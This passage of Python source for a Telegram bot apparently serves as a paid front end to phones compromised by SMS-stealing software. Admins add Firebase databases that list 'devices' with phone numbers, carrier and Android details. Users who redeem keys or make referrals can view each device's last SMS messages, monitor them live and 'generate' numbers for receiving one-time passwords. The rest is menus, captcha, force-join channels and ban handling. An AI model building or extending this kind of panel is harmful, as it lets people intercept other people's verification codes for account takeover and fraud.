        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pe('zap')} <b>Checker</b> — FREE · Firebase check / decode\n"
        f"{pe('diamond')} <b>OTP Dashboard</b> — Key or refer required\n"
        f"{pe('star')} <b>File Share</b> — FREE · upload & get share link\n\n"
        f"{pe('online')} OTP access: <b>{remaining}</b>\n"
        f"{pe('chart')} Referrals: <b>{ref_count}</b> · {pe('tada')} 1 refer = {REFERRAL_HOURS}h\n\n"
        f"{pe('announce')} Your refer link:\n<code>{refer_link}</code>\n\n"
        f"{pe('key')} <code>/redeem YOUR-KEY</code>\n\n"
        f"Pick a section below {pe('cool')}"
    )


# ============================================================
# CAPTCHA
# ============================================================
def _new_math_captcha():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    op = random.choice(("+", "-", "×"))
    answer = a + b if op == "+" else a - b if op == "-" else a * b
    return f"{a} {op} {b}", answer


# ============================================================
# SEND WELCOME
# ============================================================
async def send_welcome_photo(chat_id: int, first_name: str, *,
                              user_id: int = 0,
                              show_force_join: bool,
                              reply_markup=None, bot=None):
    try:
        if show_force_join:
            caption = build_forcejoin_caption(first_name)
        else:
            caption = build_welcome_caption_joined(first_name, user_id)
        payload = {
            "chat_id": chat_id,
            "photo": WELCOME_IMAGE_URL,
            "caption": _bold_blockquote(caption),
            "parse_mode": "HTML",
        }
        if reply_markup is not None:
            if hasattr(reply_markup, "to_dict"):
                payload["reply_markup"] = reply_markup.to_dict()
            else:
                payload["reply_markup"] = reply_markup
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload,
                                     timeout=aiohttp.ClientTimeout(total=15)) as resp:
                data = await resp.json()
                if data.get("ok"):
                    return
                if bot:
                    await bot.send_message(
                        chat_id=chat_id, text=_bold_blockquote(caption),
                        parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"[WELCOME] error: {e}")


# ============================================================
# ACCESS MIDDLEWARE
# ============================================================
async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE,
                          *, edit_target=None, require_otp: bool = True):
    """Force-join + captcha always. OTP time access only if require_otp=True.
    Checker / File Share / Main menu use require_otp=False.
    """
    user = update.effective_user
    uid = user.id

    # 0) Ban check (admins/owner never blocked by ban)
    if is_banned(uid) and uid not in ADMIN_IDS:
        ban_text = _bold_blockquote(
            "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
            "⛔ 𝗔𝗽𝗻𝗮 𝗮𝗰𝗰𝗲𝘀𝘀 𝗯𝗮𝗻 𝗵𝗼 𝗰𝗵𝘂𝗸𝗮 𝗵𝗮𝗶.\n"
            "Owner / Admin se contact karo.")
        if edit_target is not None and update.callback_query:
            try:
                cq = update.callback_query
                if getattr(cq.message, "photo", None):
                    await cq.edit_message_caption(
                        caption=ban_text, parse_mode="HTML")
                else:
                    await cq.edit_message_text(
                        ban_text, parse_mode="HTML")
            except Exception:
                pass
        elif update.effective_message:
            try:
                await update.effective_message.reply_text(
                    ban_text, parse_mode="HTML")
            except Exception:
                pass
        return False

    # 1) Maintenance
    if maintenance_mode and uid not in ADMIN_IDS:
        maintenance_text = _bold_blockquote(
            "🛠️ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️")
        if edit_target is not None and update.callback_query:
            try:
                cq = update.callback_query
                if getattr(cq.message, "photo", None):
                    await cq.edit_message_caption(
                        caption=maintenance_text, parse_mode="HTML")
                else:
                    await cq.edit_message_text(
                        maintenance_text, parse_mode="HTML")
            except Exception:
                pass
        elif update.effective_message:
            try:
                await update.effective_message.reply_text(
                    maintenance_text, parse_mode="HTML")
            except Exception:
                pass
        return False

    # 2) Force Join
    if REQUIRED_CHANNELS and uid not in ADMIN_IDS:
        joined = await check_force_join(context.bot, uid)
        user_access_state[uid] = joined
        if not joined:
            verified_access_users.discard(uid)
            context.user_data.pop("force_join_captcha", None)
            context.user_data.pop("force_join_verified", None)
            unjoined = await get_unjoined_channels(context.bot, uid)
            kb = build_dynamic_force_join_keyboard(unjoined)
            caption = build_forcejoin_caption(user.first_name or "User")
            if edit_target is not None and update.callback_query:
                try:
                    await update.callback_query.edit_message_caption(
                        caption=_bold_blockquote(caption),
                        parse_mode="HTML", reply_markup=kb)
                    return False
                except Exception:
                    pass
            chat_id = (update.effective_chat.id if update.effective_chat
                       else update.callback_query.message.chat_id)
            await send_welcome_photo(
                chat_id=chat_id, first_name=user.first_name or "User",
                user_id=uid, show_force_join=True,
                reply_markup=kb, bot=context.bot)
            return False

        # 3) Captcha
        if (captcha_enabled and uid not in ADMIN_IDS
                and uid not in verified_access_users
                and not context.user_data.get("force_join_verified")):
            question, answer = _new_math_captcha()
            context.user_data["force_join_captcha"] = answer
            captcha_text = _bold_blockquote(
                f"🔐 𝗩𝗘𝗥𝗜𝗙𝗬 𝗖𝗔𝗣𝗧𝗖𝗛𝗔\n\n"
                f"🧮 Solve: {question} = ?")
            if edit_target is not None and update.callback_query:
                try:
                    cq = update.callback_query
                    if getattr(cq.message, "photo", None):
                        await cq.edit_message_caption(
                            caption=captcha_text, parse_mode="HTML")
                    else:
                        await cq.edit_message_text(
                            captcha_text, parse_mode="HTML")
                    return False
                except Exception:
                    pass
            chat_id = (update.effective_chat.id if update.effective_chat
                       else update.callback_query.message.chat_id)
            await context.bot.send_message(
                chat_id=chat_id, text=captcha_text, parse_mode="HTML")
            return False

    # 4) Access Time Check (OTP only — Checker / File Share skip this)
    if require_otp and uid not in ADMIN_IDS and not has_access(uid):
        access_msg = _bold_blockquote(
            f"{pe('warn')} OTP ACCESS REQUIRED\n\n"
            f"{pe('key')} OTP Dashboard ke liye key / refer chahiye.\n\n"
            f"{pe('key')} /redeem YOUR-KEY\n"
            f"{pe('tada')} 1 refer = {REFERRAL_HOURS}h\n\n"
            f"{pe('announce')} Referral link:\n"
            f"<code>https://t.me/{BOT_USERNAME}?start=ref_{uid}</code>\n\n"
            f"{pe('zap')} Checker + File Share FREE hain.")
        kb = InlineKeyboardMarkup([
            [styled_button("REDEEM KEY", "redeem_help", "primary", icon="key")],
            [styled_button("CHECKER (FREE)", "mode_checker", "success", icon="zap")],
            [styled_button("FILE SHARE (FREE)", "mode_files", "primary", icon="star")],
            [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
        ])
        if edit_target is not None and update.callback_query:
            try:
                cq = update.callback_query
                if getattr(cq.message, "photo", None):
                    await cq.edit_message_caption(
                        caption=access_msg, parse_mode="HTML", reply_markup=kb)
                else:
                    await cq.edit_message_text(
                        access_msg, parse_mode="HTML", reply_markup=kb)
                return False
            except Exception:
                pass
        if update.effective_message:
            try:
                await update.effective_message.reply_text(
                    access_msg, parse_mode="HTML", reply_markup=kb)
            except Exception:
                pass
        return False

    return True


# ============================================================
# FORCE VERIFY CALLBACK
# ============================================================
async def force_verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    first_name = q.from_user.first_name or "User"

    if maintenance_mode and uid not in ADMIN_IDS:
        try:
            await q.edit_message_caption(
                caption=_bold_blockquote("🛠️ 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡"),
                parse_mode="HTML")
        except Exception:
            pass
        return

    joined = await check_force_join(context.bot, uid)
    user_access_state[uid] = joined

    if joined:
        verified_access_users.discard(uid)
        context.user_data.pop("force_join_captcha", None)
        context.user_data.pop("force_join_verified", None)
        try:
            await q.answer("✅ All channels joined!")
        except Exception:
            pass
        try:
            await q.message.delete()
        except Exception:
            pass
        if captcha_enabled and uid not in ADMIN_IDS:
            question, answer = _new_math_captcha()
            context.user_data["force_join_captcha"] = answer
            await context.bot.send_message(
                chat_id=q.message.chat_id,
                text=_bold_blockquote(
                    f"🔐 𝗩𝗘𝗥𝗜𝗙𝗬 𝗖𝗔𝗣𝗧𝗖𝗛𝗔\n\n"
                    f"🧮 Solve: {question} = ?"),
                parse_mode="HTML")
        else:
            await _send_main_menu(context, q.message.chat_id, first_name, uid)
    else:
        verified_access_users.discard(uid)
        context.user_data.pop("force_join_captcha", None)
        unjoined = await get_unjoined_channels(context.bot, uid)
        try:
            await q.answer("❌ Join all channels first!", show_alert=True)
        except Exception:
            pass
        kb = build_dynamic_force_join_keyboard(unjoined)
        try:
            await q.message.delete()
        except Exception:
            pass
        await send_welcome_photo(
            chat_id=q.message.chat_id, first_name=first_name,
            user_id=uid, show_force_join=True,
            reply_markup=kb, bot=context.bot)


# ============================================================
# MAIN MENU
# ============================================================
def connect_inline_kb(user_id: int = 0):
    """Main hub — always plain buttons so /start is reliable."""
    return plain_main_kb(user_id)


def main_home_kb(user_id: int = 0):
    return plain_main_kb(user_id)


async def _send_main_menu(context, chat_id: int, first_name: str, uid: int):
    """Send welcome with multi-level fallback so /start never dies on emoji/API issues.

    Prefer plain unicode caption first (most reliable). Rich <tg-emoji> is optional.
    """
    rich_caption = build_welcome_caption_joined(first_name, uid)
    plain_caption = plain_welcome_caption(first_name, uid)
    kb = plain_main_kb(uid)

    # 1) Photo + plain caption (most reliable)
    try:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=WELCOME_IMAGE_URL,
            caption=plain_caption,
            parse_mode="HTML",
            reply_markup=kb,
        )
        return
    except Exception as exc:
        logger.warning("welcome photo+plain failed: %s", exc)

    # 2) Photo + rich caption (premium emoji)
    try:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=WELCOME_IMAGE_URL,
            caption=rich_caption,
            parse_mode="HTML",
            reply_markup=kb,
        )
        return
    except Exception as exc:
        logger.warning("welcome photo+rich failed: %s", exc)

    # 3) Text + plain
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=plain_caption,
            parse_mode="HTML",
            reply_markup=kb,
        )
        return
    except Exception as exc:
        logger.warning("welcome text+plain failed: %s", exc)

    # 4) Text + rich
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=rich_caption,
            parse_mode="HTML",
            reply_markup=kb,
        )
        return
    except Exception as exc:
        logger.error("welcome text+rich failed: %s", exc)

    # 5) Absolute last resort
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text="VIP ALL IN ONE BOT\n\nSend /start again or contact admin.",
            reply_markup=kb,
        )
    except Exception as exc2:
        logger.error("welcome ultimate fallback failed: %s", exc2)


# ============================================================
# STYLING HELPERS
# ============================================================
def make_blockquote(text: str) -> str:
    if not text:
        return text
    stripped = text.strip()
    if stripped.startswith("<blockquote>") or stripped.startswith(">"):
        return text
    return f"<blockquote>{text}</blockquote>"


def _bold_blockquote(text: str) -> str:
    if str(text).lstrip().startswith("<blockquote>"):
        return str(text)
    raw = str(text)

    def convert_plain(value: str) -> str:
        converted = []
        for char in value.replace("*", ""):
            code = ord(char)
            if "A" <= char <= "Z":
                converted.append(chr(0x1D5D4 + (code - ord("A"))))
            elif "a" <= char <= "z":
                converted.append(chr(0x1D5EE + (code - ord("a"))))
            elif "0" <= char <= "9":
                converted.append(chr(0x1D7EC + (code - ord("0"))))
            else:
                converted.append(char)
        return html_escape("".join(converted), quote=False)

    pieces = []
    cursor = 0
    pattern = re.compile(
        r"(?P<html_code><code>(?P<html_inner>.*?)</code>)"
        r'|(?P<tg_emoji><tg-emoji\s+emoji-id="(?P<eid>\d+)">(?P<efb>.*?)</tg-emoji>)'
        r"|(?P<bt>`(?P<bt_inner>[^`]+)`)",
        re.DOTALL | re.IGNORECASE,
    )
    for match in pattern.finditer(raw):
        pieces.append(convert_plain(raw[cursor:match.start()]))
        if match.group("html_code"):
            inner = match.group("html_inner")
            pieces.append(f"<code>{html_escape(inner, quote=False)}</code>")
        elif match.group("tg_emoji"):
            # Preserve premium custom emoji tags as-is
            pieces.append(
                f'<tg-emoji emoji-id="{match.group("eid")}">{match.group("efb")}</tg-emoji>'
            )
        else:
            pieces.append(f"<code>{html_escape(match.group('bt_inner'), quote=False)}</code>")
        cursor = match.end()
    pieces.append(convert_plain(raw[cursor:]))
    return f"<blockquote>{''.join(pieces)}</blockquote>"


def styled_button(text: str, callback_data: str, style: str = None,
                  icon_custom_emoji_id: str = None, icon: str = None):
    """icon = PE key name (e.g. 'diamond') OR pass icon_custom_emoji_id directly.

    NOTE: icon_custom_emoji_id on buttons often fails unless the bot owns that
    emoji set. We still attach it; callers should have a plain-kb fallback.
    Prefix button text with unicode fallback so UI never looks empty.
    """
    fb = PE_FALLBACK.get(icon, "") if icon else ""
    label = text
    if fb and not (text.startswith(fb) or text[:1] in "🟢🔵📁🔑🎲🛡👑"):
        # Keep text clean if already has emoji; otherwise prefix fallback
        if not any(ord(ch) > 0x1F300 for ch in text[:3]):
            label = f"{fb} {text}" if fb else text
    kwargs = {"callback_data": callback_data}
    # Prefer plain buttons for reliability. Style/icon are optional extras.
    # Many hosts/Bot API builds reject unknown api_kwargs → whole /start dies.
    # So we only pass style when set; we do NOT pass icon_custom_emoji_id by default.
    # Do not pass api_kwargs (style / icon_custom_emoji_id).
    # Some Bot API / library combos reject them and /start fails silently.
    api_kwargs = {}
    # Optional: style only if explicitly safe in your PTB version
    # if style:
    #     api_kwargs["style"] = style
    if api_kwargs:
        kwargs["api_kwargs"] = api_kwargs
    try:
        return InlineKeyboardButton(label, **kwargs)
    except TypeError:
        return InlineKeyboardButton(label, callback_data=callback_data)


def plain_main_kb(user_id: int = 0):
    """No api_kwargs — safest keyboard if premium/style markup fails."""
    rows = [
        [InlineKeyboardButton("⚡ CHECKER (FREE)", callback_data="mode_checker")],
        [InlineKeyboardButton("💎 OTP DASHBOARD", callback_data="mode_otp")],
        [InlineKeyboardButton("⭐ FILE SHARE (FREE)", callback_data="mode_files")],
        [InlineKeyboardButton("🤖 BOT HOSTING", callback_data="mode_hosting")],
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="redeem_help")],
        [InlineKeyboardButton("🟢 GENERATE NUMBER", callback_data="generate_number")],
    ]
    if user_id in ADMIN_IDS:
        rows.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_back")])
    return InlineKeyboardMarkup(rows)


def plain_welcome_caption(first_name: str, user_id: int) -> str:
    """Unicode-only caption (no <tg-emoji>) for API fallback."""
    safe_name = html_escape((first_name or "User").strip())
    refer_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    remaining = "Unlimited ♾️" if user_id in ADMIN_IDS else format_remaining_time(user_id)
    rec = _ensure_user_record(user_id)
    ref_count = rec.get("referral_count", 0)
    return (
        f"🥳 Hi <b>{safe_name}</b>\n\n"
        f"💎 <b>VIP ALL IN ONE BOT</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ <b>Checker</b> — FREE · Firebase check / decode\n"
        "💎 <b>OTP Dashboard</b> — Key or refer required\n"
        "⭐ <b>File Share</b> — FREE · upload & get share link\n\n"
        f"🟢 OTP access: <b>{remaining}</b>\n"
        f"📊 Referrals: <b>{ref_count}</b> · 🎉 1 refer = {REFERRAL_HOURS}h\n\n"
        f"📢 Your refer link:\n<code>{refer_link}</code>\n\n"
        "🔑 <code>/redeem YOUR-KEY</code>\n\n"
        "Pick a section below 😎"
    )


# ============================================================
# TIME FORMATTER
# ============================================================
def _format_time(ts_key) -> str:
    if not ts_key:
        return "Unknown"
    try:
        s = str(ts_key).strip()
        if re.fullmatch(r'\d+', s):
            n = int(s)
            if n > 10**12:
                n = n // 1000
            elif n < 10**9:
                return s
            dt = datetime.fromtimestamp(n)
            return dt.strftime("%d-%m-%Y | %I:%M:%S %p")
        return s
    except Exception:
        return str(ts_key)


# ============================================================
# ADMIN KEYBOARDS
# ============================================================
def admin_panel_kb(viewer_id: int = 0):
    maintenance_label = "🟢 TURN BOT ON" if maintenance_mode else "🔴 TURN BOT OFF"
    captcha_label = "🔐 CAPTCHA ON" if captcha_enabled else "🔓 CAPTCHA OFF"
    rows = [
        [styled_button("ADD FIREBASE", "admin_add_firebase", "success", icon="zap")],
        [styled_button("MANAGE FIREBASES", "admin_manage_fb", "primary", icon="eyes")],
        [styled_button("BOT STATISTICS", "admin_stats", "primary", icon="chart")],
        [styled_button("GENERATE KEY", "admin_genkey", "success", icon="key")],
        [styled_button("LIST KEYS", "admin_listkeys", "primary", icon="unlock")],
        [styled_button("GIFT ACCESS", "admin_gift_access", "success", icon="tada")],
        [styled_button("BROADCAST", "admin_broadcast", "success", icon="announce")],
        [styled_button("BAN USER", "admin_ban_user", "danger", icon="alert")],
        [styled_button("UNBAN USER", "admin_unban_user", "success", icon="check")],
        [styled_button("BANNED LIST", "admin_banned_list", "primary", icon="red")],
        [styled_button("APPROVE HOSTING", "admin_host_approve", "success", icon="check")],
        [styled_button("REVOKE HOSTING", "admin_host_revoke", "danger", icon="alert")],
        [styled_button("HOSTING USERS", "admin_host_list", "primary", icon="eyes")],
        [styled_button(maintenance_label, "admin_toggle_maintenance", "danger", icon="warn")],
        [styled_button("FEATURE MAINTENANCE", "admin_feature_maint", "primary", icon="warn")],
        [styled_button(captcha_label, "admin_toggle_captcha", "primary", icon="unlock")],
        [styled_button("ADD FORCE JOIN CHANNEL", "admin_add_channel", "success", icon="star")],
        [styled_button("FORCE JOIN CHANNELS", "admin_channels", "primary", icon="eyes")],
    ]
    # Add / Remove Admin — only owner sees these
    if is_owner(viewer_id):
        rows.append([styled_button("ADD ADMIN", "admin_add_admin", "success", icon="crown")])
        rows.append([styled_button("REMOVE ADMIN", "admin_remove_admin", "danger", icon="alert")])
        rows.append([styled_button("ADMIN LIST", "admin_list_admins", "primary", icon="crown")])
    rows.append([InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")])
    return InlineKeyboardMarkup(rows)


def admin_feature_maint_kb():
    """Toggle individual features under maintenance."""
    rows = []
    for key in FEATURE_MAINT_KEYS:
        on = bool(feature_maintenance.get(key, False))
        label = FEATURE_MAINT_LABELS.get(key, key)
        status = "🔴 OFF (Maintenance)" if on else "🟢 ON (Live)"
        rows.append([
            styled_button(
                f"{label}: {status}",
                f"admin_toggle_feat:{key}",
                "danger" if on else "success",
            )
        ])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "danger")])
    return InlineKeyboardMarkup(rows)


def _feature_maint_status_text() -> str:
    lines = [
        "🛠️ *Feature Maintenance*\n",
        "Har feature alag se ON/OFF kar sakte ho.\n",
        "🔴 OFF = users ko maintenance dikhega\n",
        "🟢 ON = feature live\n",
    ]
    if maintenance_mode:
        lines.append("⚠️ *Global bot maintenance ON* — sab features band.\n")
    lines.append("Tap a button to toggle:")
    return "\n".join(lines)


def admin_gift_kb():
    return InlineKeyboardMarkup([
        [styled_button("👤 GIFT SINGLE USER", "admin_gift_single", "primary")],
        [styled_button("👥 GIFT ALL USERS", "admin_gift_all", "success")],
        [styled_button("🔙 ADMIN PANEL", "admin_back", "danger")],
    ])


def admin_firebases_kb():
    rows = []
    if not global_fb_list:
        rows.append([styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")])
    else:
        for i, (url, tag) in enumerate(global_fb_list):
            rows.append([styled_button(f"🔥 {tag}", f"admin_fb_info:{i}", "primary")])
            rows.append([
                styled_button("🔄 REFRESH", f"admin_fb_refresh:{i}", "success"),
                styled_button("🗑 DELETE", f"admin_fb_delete:{i}", "danger"),
            ])
        if len(global_fb_list) < MAX_FIREBASES:
            rows.append([styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "danger")])
    return InlineKeyboardMarkup(rows)


def admin_back_kb():
    return InlineKeyboardMarkup([
        [styled_button("🔙 ADMIN PANEL", "admin_back", "danger")]])


def admin_channels_kb():
    rows = []
    for index, channel in enumerate(REQUIRED_CHANNELS):
        rows.append([styled_button(
            f"🗑 REMOVE {channel.get('label', channel.get('id', '?'))[:35]}",
            f"admin_remove_channel:{index}", "danger")])
    rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "primary")])
    return InlineKeyboardMarkup(rows)


DEVICES_PER_PAGE = 6


def device_list_kb(devices: Dict[str, dict], mode: str = "online", page: int = 0):
    items = list(devices.items())[:80]
    total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    start = page * DEVICES_PER_PAGE
    page_items = items[start:start + DEVICES_PER_PAGE]
    rows = []
    for cid, info in page_items:
        phone = str(info.get("phone") or "").strip()
        label = f"🟢 {cid}"
        if phone and phone not in ("—", "N/A"):
            label += f"  |  {phone}"
        rows.append([styled_button(label[:60], f"dev:{cid}", "success")])
    nav = []
    if page > 0:
        nav.append(styled_button("◀️ PREV", f"devpage:{page-1}", "primary"))
    nav.append(styled_button(f"📄 {page+1}/{total_pages}", "noop"))
    if page < total_pages - 1:
        nav.append(styled_button("NEXT ▶️", f"devpage:{page+1}", "primary"))
    rows.append(nav)
    rows.append([styled_button("🔄 REFRESH", "scan_active", "primary")])
    rows.append([styled_button("🔙 BACK", "menu_back", "danger")])
    return InlineKeyboardMarkup(rows)


def device_actions_kb(device_id: str, mode: str = "online"):
    return InlineKeyboardMarkup([
        [styled_button("LAST 5 SMS", f"sms:{device_id}", "primary", icon="announce")],
        [styled_button("GENERATE AGAIN", "generate_number", "success", icon="online")],
        [styled_button("BACK TO DEVICE LIST", "device_list", "danger", icon="eyes")],
    ])


def sms_view_kb(device_id: str, mode: str = "online"):
    return InlineKeyboardMarkup([
        [styled_button("🔄 REFRESH", f"sms_refresh:{device_id}", "primary")],
        [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")],
        [styled_button("🔙 BACK TO DEVICE", f"dev:{device_id}", "danger")],
    ])


def sms_monitor_kb(device_id: str):
    return InlineKeyboardMarkup([
        [styled_button("⛔ STOP SMS MONITOR", f"smsmon_stop:{device_id}", "danger")],
        [styled_button("🔙 BACK TO DEVICE", f"dev:{device_id}", "primary")],
    ])


def manage_fb_kb(uid: int):
    """User manage Firebase — view/delete only (no add). Admin adds global FBs."""
    sess = user_sessions.get(uid, {})
    fb_list = sess.get("fb_list", [])
    rows = []
    for i, (url, tag) in enumerate(fb_list):
        short = fb_host_short(url)
        rows.append([styled_button(f"{tag} — {short}", f"fbnoop:{i}", "primary")])
        rows.append([
            styled_button("👁 VIEW", f"scan_fb:{i}", "success"),
            styled_button("🗑 DELETE", f"delete_fb:{i}", "danger"),
        ])
    if not fb_list:
        rows.append([InlineKeyboardButton("ℹ️ No Firebase connected", callback_data="noop")])
    rows.append([InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")])
    return InlineKeyboardMarkup(rows)


def firebase_connected_kb(uid: int):
    # Users no longer manage Firebase — only generate / scan via global panels
    return InlineKeyboardMarkup([
        [styled_button("🎲 GENERATE NUMBER", "generate_number", "success")],
        [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
    ])


# ============================================================
# ADMIN PANEL LIVE
# ============================================================
def _seconds_until_next_refresh() -> int:
    elapsed = time.monotonic() - _last_refresh_time
    remaining = ADMIN_DEVICE_REFRESH_INTERVAL - elapsed
    return max(0, int(remaining))


def _build_admin_fb_text() -> str:
    if not global_fb_list:
        return ("📋 *Manage Firebases*\n\n"
                "Abhi koi Firebase add nahi hai.\n"
                "➕ ADD FIREBASE se URL add karo.")
    lines = ["📋 *Manage Firebases*\n"]
    per_fb = global_device_cache.get("per_fb", {}) or {}
    for url, tag in global_fb_list:
        counts = per_fb.get(tag) or {}
        online = int(counts.get("online", 0))
        offline = int(counts.get("offline", 0))
        lines.append(f"*{tag}*\n   🟢 {online}  |  🔴 {offline}  |  📊 {online + offline}")
    lines.append(f"\nTotal panels: {len(global_fb_list)}/{MAX_FIREBASES}")
    lines.append(f"Cache: `{global_device_cache.get('updated_at') or 'not loaded'}`")
    remaining = _seconds_until_next_refresh()
    mins, secs = divmod(remaining, 60)
    lines.append(f"\n⏳ Next auto-refresh in: *{mins}:{secs:02d}*")
    lines.append("🔄 REFRESH se abhi update karo.")
    return "\n".join(lines)


async def _admin_panel_live_loop(bot, uid: int, chat_id: int, message_id: int):
    last_rendered = ""
    try:
        while True:
            await asyncio.sleep(ADMIN_PANEL_EDIT_INTERVAL)
            if uid not in admin_panel_live_tasks:
                break
            text = _build_admin_fb_text()
            if text == last_rendered:
                continue
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id, text=text,
                    parse_mode="Markdown", reply_markup=admin_firebases_kb())
                last_rendered = text
            except Exception as exc:
                msg = str(exc).lower()
                if "message is not modified" in msg:
                    last_rendered = text
                    continue
                if "message to edit not found" in msg or "message can't be edited" in msg:
                    break
                logger.info("admin panel live edit failed: %s", exc)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        logger.error("admin panel live loop crashed: %s", exc)
    finally:
        admin_panel_live_tasks.pop(uid, None)


def _stop_admin_panel_live_task(uid: int):
    task = admin_panel_live_tasks.pop(uid, None)
    if task and not task.done():
        task.cancel()


async def _start_admin_panel_live_task(bot, uid: int, chat_id: int, message_id: int):
    _stop_admin_panel_live_task(uid)
    task = asyncio.create_task(_admin_panel_live_loop(bot, uid, chat_id, message_id))
    admin_panel_live_tasks[uid] = task


# ============================================================
# SESSION
# ============================================================
async def _ensure_session(uid: int):
    sess = user_sessions.get(uid)
    if not sess:
        sess = {"fb_list": [], "active_fb_idx": 0, "devices": {},
                "current_device": "", "mode": "online",
                "awaiting_fb_add": False, "device_page": 0}
        user_sessions[uid] = sess
    return sess


async def _show_cached_device_list(q, sess):
    devices = sess.get("devices", {})
    page = int(sess.get("device_page", 0) or 0)
    items = list(devices.items())[:80]
    total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    sess["device_page"] = page
    online_count = sess.get("online_count", 0)
    offline_count = sess.get("offline_count", 0)
    total_count = sess.get("total_count", online_count + offline_count)
    await q.edit_message_text(
        f"📞 *DEVICES INFO*\n\n"
        f"🟢 ONLINE : {online_count}\n"
        f"🔴 OFFLINE : {offline_count}\n"
        f"📊 TOTAL : {total_count}\n"
        f"🔗 Firebase: {len(sess.get('fb_list', []))}\n\n"
        "Tap a device below.",
        parse_mode="Markdown",
        reply_markup=device_list_kb(devices, mode="online", page=page))


# ============================================================
# DEVICE VIEW BUILDER (reusable)
# ============================================================
def _build_device_view(device_id: str, info: dict):
    """Return (text, reply_markup, mode) for a device info screen."""
    tag = info.get("fb_tag", "?")
    real_cid = info.get("real_cid", device_id)
    raw = info.get("raw") or {}
    phone = info.get("phone") or "N/A"
    online = bool(info.get("online"))
    network = raw.get("network") or raw.get("operator") or "—"
    android = raw.get("android") or raw.get("androidVersion") or raw.get("os") or "—"
    battery = raw.get("battery") or raw.get("batteryLevel") or "—"
    if isinstance(battery, (int, float)):
        battery = f"{int(battery)}%"
    text = (f"📱 *{real_cid}*\n\n"
            f"🌐 Firebase: `{tag}`\n"
            f"🆔 ID: `{real_cid}`\n"
            f"📡 Status: {'🟢 ONLINE' if online else '🔴 OFFLINE'}\n"
            f"📞 Phone: `{phone}`\n"
            f"📶 Network: {network}\n"
            f"🤖 Android: {android}\n"
            f"🔋 Battery: {battery}")
    mode = "online" if online else "offline"
    return text, device_actions_kb(device_id, mode), mode


async def _show_device_view(q, sess, device_id: str):
    """Show device info screen, with fallback rebuild if info is missing."""
    info = sess.get("devices", {}).get(device_id)
    if not info:
        parsed_tag, parsed_cid = _parse_prefixed(device_id)
        fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
        if fb_url:
            info = {
                "fb_url": fb_url,
                "fb_tag": parsed_tag,
                "real_cid": parsed_cid,
                "phone": "",
                "online": True,
                "raw": {},
            }
            sess.setdefault("devices", {})[device_id] = info
        else:
            await _safe_edit_callback_message(
                q,
                "❌ *Device not found.*\n\nPlease tap REFRESH.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")],
                    [InlineKeyboardButton("🔙 BACK", callback_data="menu_back")],
                ]))
            return False
    text, markup, mode = _build_device_view(device_id, info)
    sess["current_device"] = device_id
    sess["mode"] = mode
    await _safe_edit_callback_message(q, text, parse_mode="Markdown",
                                       reply_markup=markup)
    return True


# ============================================================
# /start
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    first_name = update.effective_user.first_name or "User"
    username = update.effective_user.username or str(uid)

    if is_banned(uid) and uid not in ADMIN_IDS:
        msg = update.effective_message
        if msg:
            await msg.reply_text(
                _bold_blockquote(
                    "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
                    "⛔ 𝗔𝗽𝗻𝗮 𝗮𝗰𝗰𝗲𝘀𝘀 𝗯𝗮𝗻 𝗵𝗼 𝗰𝗵𝘂𝗸𝗮 𝗵𝗮𝗶.\n"
                    "Owner / Admin se contact karo."),
                parse_mode="HTML",
            )
        return

    if uid not in known_users:
        known_users.add(uid)
        _save_user_ids()

    _ensure_user_record(uid)
    context.user_data.pop("force_join_captcha", None)
    context.user_data.pop("force_join_verified", None)

    payload = ""
    if update.message and update.message.text and " " in update.message.text:
        parts = update.message.text.split(maxsplit=1)
        if len(parts) > 1:
            payload = parts[1].strip()

    # --- File share deep link (FREE — no OTP access required) ---
    if payload.startswith("file_"):
        token = payload[5:].strip()
        info = get_shared_file(token)
        if not info:
            await update.message.reply_text(
